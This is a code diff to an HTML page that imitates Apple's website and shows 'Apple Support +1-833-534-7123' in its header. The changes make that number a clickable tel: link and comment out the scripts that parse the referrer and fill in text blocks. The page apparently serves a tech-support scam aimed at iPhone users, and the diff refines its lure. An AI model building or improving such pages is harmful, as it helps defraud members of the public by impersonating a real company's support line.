@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
 
@@ -125,7 +124,7 @@
                 <div class="ac-ln-background"></div>
                 <div class="ac-ln-content">
                     <span class="ac-ln-title">
-                       <a href="#">Apple Support +1-833-534-7123 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+                       <a href="tel: +1-833-534-7123">Apple Support +1-833-534-7123 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
 					 </span>
                     <div class="ac-ln-menu">
                         <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
@@ -273,7 +272,7 @@
         window.number = (window.number ? window.number : '+1-833-534-7123');
 
         window.device = 'iPhone';
-        window.refef = parseURL(document.referrer);
+      //  window.refef = parseURL(document.referrer);
 
         if (ios) {
 
@@ -313,10 +312,10 @@
             text = getURLParameter('text');
         }
 
-        var sText = document.querySelectorAll('.js_setTextBlock');
-        for (var t = 0; t < sText.length; t++) {
-            sText[t].innerHTML = getText();
-        }
+        // var sText = document.querySelectorAll('.js_setTextBlock');
+        // for (var t = 0; t < sText.length; t++) {
+        //     sText[t].innerHTML = getText();
+        // }
         var sPhone = document.querySelectorAll('.js_setPhoneBlock');
         for (var p = 0; p < sPhone.length; p++) {
             sPhone[p].innerHTML = phone;
